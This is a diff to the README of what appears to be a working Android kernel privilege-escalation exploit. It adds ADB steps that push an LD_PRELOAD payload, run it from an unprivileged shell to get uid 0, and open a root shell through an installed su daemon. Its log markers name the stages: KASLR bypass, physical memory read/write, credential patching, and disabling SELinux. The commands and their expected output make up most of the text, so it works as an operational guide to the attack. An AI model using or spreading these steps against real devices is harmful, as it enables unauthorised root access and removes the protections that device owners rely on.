@@ -55,22 +55,57 @@ export NDK_ROOT=/path/to/android-ndk-r27c
 Outputs: `prebuilt/preload.so` (LD_PRELOAD payload) and an embedded
 `su_daemon` PIE.
 
-## Run
+## ADB usage (one-shot root)
+
+Requires an ADB shell (a normal, unprivileged `adb shell` is enough — the
+exploit runs entirely unprivileged and escalates itself).
 
 ```bash
+# 1. push the payload
 adb push prebuilt/preload.so /data/local/tmp/
+
+# 2. run the exploit against any command (here: id) via LD_PRELOAD
 adb shell LD_PRELOAD=/data/local/tmp/preload.so id
+
+# expected on success: uid=0(root) gid=0(root) groups=...
+# on failure the process exits 1 and the log below tells you where it stopped.
 ```
 
-A **forced real-time disk log** (every `pr_*` line is `write()+fsync()`-ed) is
-written to:
+Optional one-liner variants:
+
+```bash
+# capture the exit status too
+adb shell "LD_PRELOAD=/data/local/tmp/preload.so id; echo rc=\$?"
+
+# interactive root shell (the exploit also installs an su daemon)
+adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sh -c 'su -c id'"
+```
+
+### Debug log (survives panic/reboot)
+
+Every `pr_*` line is mirrored to disk with an immediate `write()+fsync()` so the
+trail survives a kernel panic/reboot:
 
 ```
 /sdcard/Download/log_<timestamp>.txt
 ```
 
-so the debug trail survives a kernel panic/reboot. Fallback paths:
-`/sdcard/Downloads`, `/data/local/tmp`.
+Fallback paths if `/sdcard` is unavailable: `/sdcard/Downloads`,
+`/data/local/tmp/log_<timestamp>.txt`.
+
+```bash
+# after the run (even after a reboot):
+adb shell "ls -t /sdcard/Download/log_*.txt | head -1"
+adb shell "cat $(adb shell 'ls -t /sdcard/Download/log_*.txt | head -1' | tr -d '\r')"
+```
+
+Key log markers:
+- `preload starting pid=... log=/sdcard/Download/log_<ts>.txt` — payload loaded
+- `slide-kaslr-ok ... base=...` — KASLR base recovered
+- `pipe-physrw-summary ... root=1 ...` — phys RW installed
+- `uid_before=... uid_after=0 ... selinux=1->0` — creds patched
+- on 4.19 the slide gadget prints `UNVERIFIED` before its first attempt — that
+  stage is the one to tune per device using this log.
 
 ## Notes & limitations
 
